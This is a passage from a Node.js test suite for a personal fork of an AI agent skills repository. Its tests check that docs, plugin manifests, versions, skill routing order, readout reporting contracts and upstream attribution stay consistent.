  assert.match(architecture, /codex\/plugins\/qs-skills\/skills\//);
  assert.match(architecture, /\.claude-plugin\/plugin\.json/);
  assert.match(architecture, /api\/v1\/readouts/);
  assert.match(architecture, /22 upstream|22 adapted/i);
  assert.match(architecture, /24 promoted/i);

  assert.match(operations, /reports\.quickstark\.com/);
  assert.match(operations, /api\/v1\/readouts/);
  assert.match(operations, /QS_READOUT_PRODUCER_TOKEN/);
  assert.match(operations, /only required setting/i);
  assert.match(operations, /current working directory/i);
  assert.match(operations, /(?:without|no).{0,40}(?:Git|remote)|(?:Git|remote).{0,40}(?:available|optional)/i);
  assert.match(operations, /Skill run metrics/);
  assert.doesNotMatch(operations, /export QS_READOUT_(?:PUBLISH_PROJECTS|INGESTION_URL|PRODUCER_ID|HARNESS)/);
  assert.match(operations, /\b401\b/);
  assert.match(operations, /\b409\b/);
  assert.match(operations, /rotation|rotate|revocation/i);
  assert.match(operations, /local.only/i);

  assert.match(contributing, /scripts\/qs-skill-catalog\.mjs/);
  assert.match(contributing, /npm run sync:codex/);
  assert.match(contributing, /npm run check:codex/);
  assert.match(contributing, /npm test/);
  assert.match(contributing, /upstream/i);
  assert.match(contributing, /Matt Pocock/);

  const [crossHarnessSpecification, crossHarnessTicketPlan] = await Promise.all([
    readFile(
      join(repositoryRoot, "docs", "specs", "cross-harness-skill-readout-ingestion.md"),
      "utf8",
    ),
    readFile(
      join(repositoryRoot, "docs", "specs", "cross-harness-skill-readout-ticket-plan.md"),
      "utf8",
    ),
  ]);

  assert.match(crossHarnessSpecification, /^Status: implemented in QuickStark 2\.4\.0\./m);
  assert.doesNotMatch(crossHarnessSpecification, /implementation-ready specification/i);
  assert.match(crossHarnessSpecification, /readout-operations\.md/);
  assert.match(crossHarnessTicketPlan, /^Status: implementation plan.*QuickStark 2\.4\.0/m);
  assert.match(crossHarnessTicketPlan, /acceptance checkboxes.*planning criteria/i);
  assert.match(crossHarnessTicketPlan, /separately located laptop/i);
  assert.match(crossHarnessTicketPlan, /readout-operations\.md/);
});

test("the changelog documents the actual QuickStark version and preserves upstream attribution", async () => {
  const [changelog, project] = await Promise.all([
    readFile(join(repositoryRoot, "CHANGELOG.md"), "utf8"),
    readFile(join(repositoryRoot, "package.json"), "utf8").then(JSON.parse),
  ]);

  const escapedVersion = project.version.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");

  assert.match(changelog, new RegExp(`^## ${escapedVersion}\\s*$`, "m"));
  assert.match(changelog, /authenticated.*(?:ingestion|publishing)|(?:ingestion|publishing).*authenticated/i);
  assert.match(changelog, /qs-code-document/);
  assert.match(changelog, /Matt Pocock/);
  assert.match(changelog, /https:\/\/github\.com\/mattpocock\/skills\//);
  assert.doesNotMatch(
    changelog,
    new RegExp(`https:\\/\\/github\\.com\\/quickstark\\/skills\\/releases\\/tag\\/v?${escapedVersion}`),
    "a repository version must not be presented as an unverified GitHub release",
  );
});

test("the root and bucket indexes list exactly the promoted skills", async () => {
  const rootReadme = await readFile(join(repositoryRoot, "README.md"), "utf8");

  for (const skill of SKILLS) {
    const expectedLink = `./skills/${skill.bucket}/${skill.name}/SKILL.md`;
    assert.ok(rootReadme.includes(expectedLink), `root README omits ${skill.name}`);

    const bucketReadme = await readFile(
      join(repositoryRoot, "skills", skill.bucket, "README.md"),
      "utf8",
    );
    assert.ok(bucketReadme.includes(`./${skill.name}/SKILL.md`), `${skill.bucket} README omits ${skill.name}`);
  }

  for (const bucket of ["misc", "personal", "in-progress", "deprecated"]) {
    const entries = await readdir(join(repositoryRoot, "skills", bucket), {
      withFileTypes: true,
    });

    for (const entry of entries.filter((item) => item.isDirectory())) {
      assert.ok(
        !rootReadme.includes(`./skills/${bucket}/${entry.name}/SKILL.md`),
        `non-promoted ${bucket}/${entry.name} leaked into the root index`,
      );
    }
  }
});

test("the Claude plugin exposes exactly the promoted skills with a synchronized version", async () => {
  const [plugin, marketplace, project] = await Promise.all([
    readFile(join(repositoryRoot, ".claude-plugin", "plugin.json"), "utf8").then(JSON.parse),
    readFile(join(repositoryRoot, ".claude-plugin", "marketplace.json"), "utf8").then(JSON.parse),
    readFile(join(repositoryRoot, "package.json"), "utf8").then(JSON.parse),
  ]);

  const expectedPaths = SKILLS.map((skill) => `./skills/${skill.bucket}/${skill.name}`).sort();

  assert.equal(project.name, "qs-skills");
  assert.equal(plugin.name, "qs-skills");
  assert.equal(plugin.version, project.version);
  assert.deepEqual([...plugin.skills].sort(), expectedPaths);
  assert.equal(marketplace.name, "quickstark");
  assert.equal(marketplace.plugins.length, 1);
  assert.equal(marketplace.plugins[0].name, "qs-skills");
});

test("the Codex marketplace and native plugin are validly connected", async () => {
  const [marketplace, plugin, project] = await Promise.all([
    readFile(join(repositoryRoot, "codex", ".agents", "plugins", "marketplace.json"), "utf8").then(JSON.parse),
    readFile(join(repositoryRoot, "codex", "plugins", "qs-skills", ".codex-plugin", "plugin.json"), "utf8").then(JSON.parse),
    readFile(join(repositoryRoot, "package.json"), "utf8").then(JSON.parse),
  ]);

  assert.equal(marketplace.name, "quickstark");
  assert.equal(marketplace.plugins.length, 1);
  assert.equal(marketplace.plugins[0].name, "qs-skills");
  assert.equal(marketplace.plugins[0].source.source, "local");
  assert.equal(marketplace.plugins[0].source.path, "./plugins/qs-skills");
  assert.equal(marketplace.plugins[0].policy.installation, "AVAILABLE");
  assert.equal(marketplace.plugins[0].policy.authentication, "ON_INSTALL");
  assert.equal(marketplace.plugins[0].category, "Coding");
  assert.equal(plugin.name, "qs-skills");
  assert.equal(plugin.version, project.version);
  assert.equal(plugin.skills, "./skills/");
  assert.equal(plugin.interface.category, "Coding");
});

test("repository and plugin metadata point to the personal QuickStark fork", async () => {
  const [project, claudePlugin, codexPlugin, readme] = await Promise.all([
    readFile(join(repositoryRoot, "package.json"), "utf8").then(JSON.parse),
    readFile(join(repositoryRoot, ".claude-plugin", "plugin.json"), "utf8").then(JSON.parse),
    readFile(
      join(repositoryRoot, "codex", "plugins", "qs-skills", ".codex-plugin", "plugin.json"),
      "utf8",
    ).then(JSON.parse),
    readFile(join(repositoryRoot, "README.md"), "utf8"),
  ]);

  assert.equal(project.repository.url, personalRepository);
  assert.equal(claudePlugin.homepage, personalRepository);
  assert.equal(claudePlugin.repository, personalRepository);
  assert.equal(codexPlugin.homepage, personalRepository);
  assert.equal(codexPlugin.interface.websiteURL, personalRepository);
  assert.ok(readme.includes(`git clone ${personalRepository}.git`));
  assert.match(readme, /git fetch upstream/);
});

test("the Codex package is a curated, Codex-compatible snapshot of the canonical skills", async () => {
  const generatedRoot = join(repositoryRoot, "codex", "plugins", "qs-skills", "skills");
  const entries = await readdir(generatedRoot, { withFileTypes: true });
  const packagedNames = entries.filter((entry) => entry.isDirectory()).map((entry) => entry.name).sort();

  assert.deepEqual(packagedNames, SKILLS.map((skill) => skill.name).sort());

  for (const skill of SKILLS) {
    const source = join(repositoryRoot, "skills", skill.bucket, skill.name);
    const packaged = join(generatedRoot, skill.name);
    const sourceFiles = await listFiles(source);
    const packagedFiles = await listFiles(packaged);

    assert.deepEqual(packagedFiles, sourceFiles, `${skill.name} has stale packaged files`);

    for (const file of sourceFiles) {
      const [sourceBytes, packagedBytes] = await Promise.all([
        readFile(join(source, file)),
        readFile(join(packaged, file)),
      ]);
      const expected =
        file === "SKILL.md"
          ? Buffer.from(formatSkillForCodex(sourceBytes.toString("utf8"), skill))
          : sourceBytes;

      assert.ok(expected.equals(packagedBytes), `${skill.name}/${file} is out of sync`);

      if (file === "SKILL.md" && skill.userInvoked) {
        assert.doesNotMatch(
          packagedBytes.toString("utf8"),
          /^disable-model-invocation:\s*true\s*$/m,
          `Claude-only invocation flag leaked into Codex: ${skill.name}`,
        );
      }

      if (file === "SKILL.md") {
        assert.doesNotMatch(
          packagedBytes.toString("utf8"),
          /^argument-hint:\s*/m,
          `Claude-only argument hint leaked into Codex: ${skill.name}`,
        );
      }
    }
  }
});

test("installed Codex skills receive the exact canonical catalog, portfolio, report presentation module, and HTML readout helper", async () => {
  const packagedSupport = join(repositoryRoot, "codex", "plugins", "qs-skills", "scripts");
  const expected = [
    "qs-readout-portfolio.mjs",
    "qs-skill-catalog.mjs",
    "qs-skill-report-presentation.mjs",
    "qs-skill-readout.mjs",
  ].sort();

  assert.deepEqual(await listFiles(packagedSupport), expected);

  for (const file of expected) {
    const [canonical, packaged] = await Promise.all([
      readFile(join(repositoryRoot, "scripts", file)),
      readFile(join(packagedSupport, file)),
    ]);

    assert.ok(canonical.equals(packaged), `${file} is not synchronized into the Codex plugin`);
  }
});

test("project, plugin, and lockfile versions stay synchronized", async () => {
  const [project, lockfile, claudePlugin, codexPlugin] = await Promise.all([
    readFile(join(repositoryRoot, "package.json"), "utf8").then(JSON.parse),
    readFile(join(repositoryRoot, "package-lock.json"), "utf8").then(JSON.parse),
    readFile(join(repositoryRoot, ".claude-plugin", "plugin.json"), "utf8").then(JSON.parse),
    readFile(
      join(repositoryRoot, "codex", "plugins", "qs-skills", ".codex-plugin", "plugin.json"),
      "utf8",
    ).then(JSON.parse),
  ]);

  assert.match(project.version, /^\d+\.\d+\.\d+(?:-[\da-z.-]+)?$/i);
  assert.equal(lockfile.name, project.name);
  assert.equal(lockfile.version, project.version);
  assert.equal(lockfile.packages[""].name, project.name);
  assert.equal(lockfile.packages[""].version, project.version);
  assert.equal(claudePlugin.version, project.version);
  assert.equal(codexPlugin.version, project.version);
});

test("Changesets target QuickStark while preserving historical upstream changesets", async () => {
  const changesetRoot = join(repositoryRoot, ".changeset");
  const upstreamArchive = join(repositoryRoot, "docs", "upstream", "changesets");
  const [configuration, rootEntries, upstreamEntries] = await Promise.all([
    readFile(join(changesetRoot, "config.json"), "utf8").then(JSON.parse),
    readdir(changesetRoot, { withFileTypes: true }),
    readdir(upstreamArchive, { withFileTypes: true }),
  ]);

  assert.equal(configuration.changelog[1].repo, "quickstark/skills");

  const upstreamNames = upstreamEntries
    .filter((entry) => entry.isFile() && entry.name.endsWith(".md") && entry.name !== "README.md")
    .map((entry) => entry.name)
    .sort();

  assert.deepEqual(upstreamNames, [
    "ask-matt-wayfinder-guidance.md",
    "codex-skill-metadata.md",
    "friendlier-setup-and-local-tickets.md",
    "grilling-general-use.md",
    "prototype-primary-source.md",
    "ship-as-claude-plugin.md",
    "wayfinder-decision-tickets.md",
    "wayfinder-research-subagents.md",
    "yagni-scope-improve-architecture.md",
  ]);

  for (const name of upstreamNames) {
    const historical = await readFile(join(upstreamArchive, name), "utf8");
    assert.match(historical, /^---\n"mattpocock-skills": (minor|patch)\n---/);
  }

  for (const entry of rootEntries) {
    if (!entry.isFile() || !entry.name.endsWith(".md") || entry.name === "README.md") {
      continue;
    }

    const pending = await readFile(join(changesetRoot, entry.name), "utf8");

    if (/^---\r?\n---(?:\r?\n|$)/.test(pending)) {
      continue;
    }

    assert.match(pending, /^---\n"qs-skills": (major|minor|patch)\n---/);
    assert.doesNotMatch(pending, /^"mattpocock-skills":/m);
  }
});

test("the versioned QuickStark release passes executable Changesets status", async () => {
  const { stdout } = await execFileAsync("npm", ["run", "changeset", "--", "status"], {
    cwd: repositoryRoot,
  });

  assert.match(stdout, /packages to be bumped at patch/i);
  assert.match(stdout, /packages to be bumped at minor/i);
  assert.match(stdout, /packages to be bumped at major/i);
  assert.doesNotMatch(stdout, /mattpocock-skills/i);
});

test("the router describes the personalized end-to-end workflow", async () => {
  const router = await readFile(
    join(repositoryRoot, "skills", "engineering", "qs-help", "SKILL.md"),
    "utf8",
  );

  for (const skill of SKILLS) {
    if (skill.name === "qs-help") continue;
    assert.ok(router.includes(`/${skill.name}`), `router omits /${skill.name}`);
  }

  for (const skill of UPSTREAM_SKILLS) {
    assert.doesNotMatch(
      router,
      new RegExp(`(?<![a-z0-9_-])\\/${skill.upstreamName}(?![a-z0-9_-])`, "i"),
      `router still invokes /${skill.upstreamName}`,
    );
  }
});

test("the help router enumerates the right order for new work", async () => {
  const router = await readFile(
    join(repositoryRoot, "skills", "engineering", "qs-help", "SKILL.md"),
    "utf8",
  );
  const start = router.indexOf("## Order of operations: new work");
  const end = router.indexOf("## Order of operations: refactoring");

  assert.ok(start >= 0, "the new-work order is not documented");
  assert.ok(end > start, "the new-work and refactoring workflows are not distinct");

  const workflow = router.slice(start, end);
  const expectedOrder = [
    "qs-setup",
    "qs-plan-clarify",
    "qs-plan-roadmap",
    "qs-plan-research",
    "qs-design-domain",
    "qs-design-prototype",
    "qs-plan-spec",
    "qs-plan-tickets",
    "qs-design-modules",
    "qs-code-build",
    "qs-review-code",
    "qs-git-merge",
    "qs-deploy-release",
  ];
  let previous = -1;

  for (const name of expectedOrder) {
    const current = workflow.indexOf(`/${name}`);
    assert.ok(current > previous, `${name} appears out of order in the new-work workflow`);
    previous = current;
  }

  assert.match(workflow, /small change/i);
  assert.match(workflow, /only when/i);
});

test("the help router enumerates safe, test-first refactoring", async () => {
  const router = await readFile(
    join(repositoryRoot, "skills", "engineering", "qs-help", "SKILL.md"),
    "utf8",
  );
  const start = router.indexOf("## Order of operations: refactoring");
  const end = router.indexOf("## Every skill and its purpose");

  assert.ok(start >= 0, "the refactoring order is not documented");
  assert.ok(end > start, "refactoring must be separate from the skill catalog");

  const workflow = router.slice(start, end);
  const expectedOrder = [
    "qs-design-architecture",
    "qs-plan-clarify",
    "qs-design-modules",
    "qs-test-tdd",
    "qs-code-build",
    "qs-review-code",
    "qs-git-merge",
    "qs-deploy-release",
  ];
  let previous = -1;

  for (const name of expectedOrder) {
    const current = workflow.indexOf(`/${name}`);
    assert.ok(current > previous, `${name} appears out of order in the refactoring workflow`);
    previous = current;
  }

  assert.match(workflow, /behavior/i);
  assert.match(workflow, /approval|authorization/i);
});

test("the help router clearly articulates every promoted skill's purpose", async () => {
  const router = await readFile(
    join(repositoryRoot, "skills", "engineering", "qs-help", "SKILL.md"),
    "utf8",
  );
  const heading = "## Every skill and its purpose";
  const start = router.indexOf(heading);
  const end = router.indexOf("## Context and handoffs", start);

  assert.ok(start >= 0, "the help router does not provide a complete skill catalog");
  assert.ok(end > start, "the skill-purpose catalog is not clearly bounded");

  const catalog = router.slice(start, end);

  for (const skill of SKILLS) {
    const row = catalog
      .split("\n")
      .find((line) => line.startsWith(`| \`/${skill.name}\` | `));

    assert.ok(row, `the help router does not include /${skill.name}`);
    const purpose = row.split("|")[2]?.trim();
    assert.ok(
      purpose && purpose.length >= 15,
      `the help router does not clearly explain /${skill.name}`,
    );
  }
});

test("every featured continuation invokes its first approved skill with catalog-derived model guidance", () => {
  for (const skill of SKILLS) {
    const contract = renderSkillOutputContract(skill);
    const recommendation = NEXT_SKILLS_BY_NAME[skill.name][0];
    const target = SKILLS_BY_NAME.get(recommendation.name);
    const guidance = MODEL_GUIDANCE_BY_NAME[recommendation.name];
    const section = contract.slice(
      contract.indexOf("**Top next prompts:**"),
      contract.indexOf("Use the same fenced-prompt and muted callout format"),
    );
    const prompt = section.match(/```text\n([^\n]+)\n```/);
    const model = section.match(
      /^> Suggested model: `([^`]+)` · Suggested thinking: `([^`]+)`$/m,
    );

    assert.ok(target, `${skill.name} must feature a real promoted skill`);
    assert.ok(guidance, `${skill.name} must use actual catalog model guidance`);
    assert.equal(
      prompt?.[1],
      `Use $${target.name} to ${target.prompt}.`,
      `${skill.name} must prominently feature its first approved continuation`,
    );
    assert.equal(model?.[1], guidance.model, `${skill.name} features the wrong model`);
    assert.equal(model?.[2], guidance.thinking, `${skill.name} features the wrong thinking level`);
    assert.doesNotMatch(contract, /\/qs-skill-name\b/, `${skill.name} features a nonexistent skill`);
  }
});

test("every promoted skill truthfully describes the full-height Project Workbench without retired gallery views", () => {
  const retiredViews = /searchable project explorer|recent-activity timeline|three production views/i;

  for (const skill of SKILLS) {
    const contract = renderSkillOutputContract(skill);
    const documentation = renderDocumentationOutputContract(skill);

    assert.match(
      contract,
      /full-height, project-first Project Workbench/i,
      `/${skill.name} must describe the actual integrated production application`,
    );
    assert.doesNotMatch(
      contract,
      retiredViews,
      `/${skill.name} must not promise removed multi-view gallery navigation`,
    );
    assert.match(
      documentation,
      /full-height, project-first Project Workbench/i,
      `/${skill.name} documentation must describe the actual production application`,
    );
    assert.doesNotMatch(
      documentation,
      retiredViews,
      `/${skill.name} documentation must not restore removed gallery views`,
    );
  }
});

test("the standard report distinguishes actual skills from suggested next steps", () => {
  for (const skill of SKILLS) {
    const contract = renderSkillOutputContract(skill);

    for (const field of ["Status:", "Skills used:", "Outcome:", "Execution:", "Readout:", "Outputs:", "Checks:", "Delivery:", "Top next prompts:"]) {
      assert.ok(contract.includes(field), `${skill.name} omits the ${field} field`);
    }

    assert.match(contract, /architecture-quality, self-contained HTML readout/);
    assert.match(contract, /scripts\/qs-skill-readout\.mjs/);
    assert.match(contract, /automatically starts or reuses a verified readout viewer/i);
    assert.match(contract, /QS_READOUT_DIR/);
    assert.match(contract, /project-organized/i);
    assert.match(contract, /temporary.*default/i);
    assert.match(contract, /purpose-specific/i);
    assert.match(contract, /actual (?:recorded )?(?:evidence|results|checks)/i);
    assert.match(contract, /provenance/);
    assert.match(contract, /actual execution machine/i);
    assert.match(contract, /execution\.deployments/);
    assert.match(contract, /execution\.files/);
    assert.match(contract, /unrelated existing work/i);
    assert.match(contract, /closedByRelease/);
    assert.match(contract, /commit\.published/);
    assert.match(contract, /standards.*specification/i);
    assert.match(contract, /relationships/);
    assert.match(contract, /QS_READOUT_ACCESS=ssh/);
    assert.match(contract, /Tailscale is not required/);
    assert.match(contract, /do not bind to every network interface/i);
    assert.match(contract, /only skills that actually ran/);
    assert.match(contract, /only the tests, validations, or observations actually performed/i);
    assert.match(contract, /copy-ready/i);
    assert.match(contract, /fenced (?:text )?code block/i);
    assert.match(contract, /muted (?:model )?callout/i);
    assert.match(contract, /\*\*Top next prompts:\*\*/);
    assert.match(contract, /```text\nUse \$qs-[a-z0-9-]+ to [^\n]+\n```/);
    assert.match(contract, /^> Suggested model: /m);
    assert.match(contract, /actual outcome, findings, decisions, outputs, and checks/i);
    assert.match(contract, /explicitly invokes its catalog-approved skill/i);
    assert.match(contract, /Codex-native.*\$qs-/i);
    assert.match(contract, /blue skill mention.*Codex composer/i);
    assert.match(contract, /suggested model/i);
    assert.match(contract, /suggested thinking/i);
    assert.match(contract, /heuristic/i);
    assert.match(contract, /never change the active model or thinking level/i);
    assert.doesNotMatch(contract, /Next best:/);
    assert.match(contract, /Awaiting input/);
    assert.match(contract, /the requested work is complete/);

    const documentation = renderDocumentationOutputContract(skill);

    assert.match(documentation, /QS_READOUT_DIR/);
    assert.match(documentation, /project-organized/i);
    assert.match(documentation, /purpose-specific/i);
    assert.match(documentation, /actual execution machine/i);
    assert.match(documentation, /verified deployment/i);
    assert.match(documentation, /verified GitHub pull requests/i);
    assert.match(documentation, /released versions/i);
    assert.match(documentation, /copy-ready/i);
    assert.match(documentation, /top next prompts/i);
    assert.match(documentation, /fenced (?:text )?code block/i);
    assert.match(documentation, /^> Suggested model: /m);
    assert.match(documentation, /suggested model/i);
    assert.match(documentation, /suggested thinking/i);
    assert.match(documentation, /heuristic/i);
    assert.match(documentation, /Codex-native.*\$qs-/i);

    for (const next of NEXT_SKILLS_BY_NAME[skill.name]) {
      assert.match(contract, new RegExp(`Use \\$${next.name} to `));
      assert.match(documentation, new RegExp(`Use \\$${next.name} to `));
      const fencedPrompt = new RegExp(`\x60\x60\x60text\\nUse \\$${next.name} to [^\\n]+\\n\x60\x60\x60`);

      assert.match(contract, fencedPrompt);
      assert.match(documentation, fencedPrompt);
      assert.ok(contract.includes(MODEL_GUIDANCE_BY_NAME[next.name].model));
      assert.ok(contract.includes(MODEL_GUIDANCE_BY_NAME[next.name].thinking));
    }
  }
});

test("every promoted skill requires the authenticated reports domain instead of accepting local or private-IP readouts", async () => {
  for (const skill of SKILLS) {
    const contract = renderSkillOutputContract(skill);
    const documentation = renderDocumentationOutputContract(skill);

    assert.match(contract, /readout\.mjs["`]?\s+render\s+--require-hosted/i,
      `${skill.name} must use the hosted-only renderer for ordinary skill completion`);
    assert.match(contract, /Readout:\s+Verified https:\/\/reports\.quickstark\.com\//,
      `${skill.name} must present the verified reports domain as the user-facing readout`);
    assert.doesNotMatch(contract, /Readout:\s+Real absolute HTML path or verified private viewer URL/i,
      `${skill.name} must not accept the exact local path or private-IP output reported by the user`);
    assert.match(contract, /(?:missing|unavailable).*(?:credential|token).*(?:fail|report)/i,
      `${skill.name} must explain a missing producer credential instead of silently opening localhost`);
    assert.match(documentation, /https:\/\/reports\.quickstark\.com\//,
      `${skill.name} documentation must describe the canonical hosted report domain`);
    assert.doesNotMatch(documentation,
      /On a Mac the viewer uses localhost; on a headless or SSH-connected Linux dev box it uses a protected private home-network URL/i,
      `${skill.name} documentation must not describe local URLs as the ordinary skill result`);
  }

  const architecture = await readFile(
    join(repositoryRoot, "skills", "engineering", "qs-design-architecture", "SKILL.md"),
    "utf8",
  );

  assert.doesNotMatch(architecture, /Include the real absolute path in the shared QuickStark skill readout/i,
    "the architecture skill must not return its temporary HTML source as the report");
  assert.doesNotMatch(architecture, /(?:xdg-open|open|start)\s+<path>/i,
    "architecture results must not open a filesystem path in the editor instead of the hosted browser report");
  assert.match(architecture, /https:\/\/reports\.quickstark\.com\//,
    "the architecture skill must present the authenticated reports-domain URL");
});

test("the router, skill-writing vocabulary, and project guidance agree on contextual next prompts", async () => {
  const [router, skill, glossary, documentation, readme, guidance, context] = await Promise.all([
    readFile(join(repositoryRoot, "skills", "engineering", "qs-help", "SKILL.md"), "utf8"),
    readFile(join(repositoryRoot, "skills", "productivity", "qs-skill-write", "SKILL.md"), "utf8"),
    readFile(join(repositoryRoot, "skills", "productivity", "qs-skill-write", "GLOSSARY.md"), "utf8"),
    readFile(join(repositoryRoot, "docs", "productivity", "qs-skill-write.md"), "utf8"),
    readFile(join(repositoryRoot, "README.md"), "utf8"),
    readFile(join(repositoryRoot, "CLAUDE.md"), "utf8"),
    readFile(join(repositoryRoot, "CONTEXT.md"), "utf8"),
  ]);

  assert.match(router, /copy-ready next prompts/i);
  assert.match(router, /work already accomplished/i);
  assert.match(router, /fenced (?:text )?code block/i);
  assert.match(skill, /^## Next prompts$/m);
  assert.match(skill, /catalog-approved/i);
  assert.match(skill, /suggested model/i);
  assert.match(skill, /thinking level/i);
  assert.match(skill, /fenced (?:text )?code block/i);
  assert.match(skill, /muted (?:model )?callout/i);
  assert.match(glossary, /^### Next Prompt$/m);
  assert.match(glossary, /cognitive load/i);
  assert.match(documentation, /\*\*Next prompts\*\*/);
  assert.match(readme, /Top next prompts:/);
  assert.match(readme, /\*\*Top next prompts:\*\*/);
  assert.match(readme, /```text\nUse \$qs-plan-clarify to [^\n]+\n```/);
  assert.match(readme, /^> Suggested model: /m);
  assert.match(readme, /Suggested model:/);
  assert.match(readme, /Suggested thinking:/);
  assert.match(readme, /heuristic/i);
  assert.match(guidance, /\*\*Top next prompts\*\*/);
  assert.match(guidance, /suggested model/i);
  assert.match(guidance, /thinking level/i);
  assert.match(context, /\*\*Next prompt\*\*/);
  assert.match(context, /heuristic/i);

  for (const content of [router, skill, documentation, readme, guidance]) {
    assert.doesNotMatch(content, /Next best:/);
  }
});

test("original promoted folder names have all been migrated", async () => {
  for (const skill of UPSTREAM_SKILLS) {
    assert.equal(
      await exists(join(repositoryRoot, "skills", skill.bucket, skill.upstreamName)),
      false,
      `old skill folder remains: ${skill.upstreamName}`,
    );
    assert.equal(
      await exists(join(repositoryRoot, "docs", skill.bucket, `${skill.upstreamName}.md`)),
      false,
      `old documentation remains: ${skill.upstreamName}`,
    );
  }
});

test("promoted skills and documentation do not invoke obsolete upstream commands", async () => {
  for (const skill of SKILLS) {
    const source = join(repositoryRoot, "skills", skill.bucket, skill.name);
    const markdown = (await listFiles(source))
      .filter((file) => file.endsWith(".md"))
      .map((file) => join(source, file));

    markdown.push(
      join(repositoryRoot, "docs", skill.bucket, `${skill.name}.md`),
    );

    for (const file of markdown) {
      const content = (await readFile(file, "utf8")).replace(
        /https?:\/\/[^\s)>\]]+/g,
        "",
      );

      for (const upstream of UPSTREAM_SKILLS) {
        assert.doesNotMatch(
          content,
          new RegExp(
            `(?<![A-Za-z0-9_-])\\/${upstream.upstreamName}(?![A-Za-z0-9_-])`,
          ),
          `${relative(repositoryRoot, file)} still invokes /${upstream.upstreamName}`,
        );
      }
    }
  }
});

test("deployment remains explicit and never invents an external release workflow", async () => {
  const skill = await readFile(
    join(repositoryRoot, "skills", "engineering", "qs-deploy-release", "SKILL.md"),
    "utf8",
  );
  const metadata = await readFile(
    join(
      repositoryRoot,
      "codex",
      "plugins",
      "qs-skills",
      "skills",
      "qs-deploy-release",
      "agents",
      "openai.yaml",
    ),
    "utf8",
  );

  assert.match(skill, /^disable-model-invocation:\s*true\s*$/m);
  assert.match(metadata, /^\s*allow_implicit_invocation:\s*false\s*$/m);
  assert.match(skill, /Never invent a deployment target/);
  assert.match(skill, /Obtain explicit confirmation/);
  assert.match(skill, /documented rollback/);
});

test("Matt Pocock's upstream attribution and MIT license remain intact", async () => {
  const [license, readme] = await Promise.all([
    readFile(join(repositoryRoot, "LICENSE"), "utf8"),
    readFile(join(repositoryRoot, "README.md"), "utf8"),
  ]);

  assert.match(license, /MIT License/);
  assert.match(license, /Copyright \(c\) 2026 Matt Pocock/);
  assert.match(readme, /https:\/\/github\.com\/mattpocock\/skills/);
  assert.match(readme, /git fetch upstream/);
  assert.match(readme, /scripts\/qs-skill-catalog\.mjs/);
});
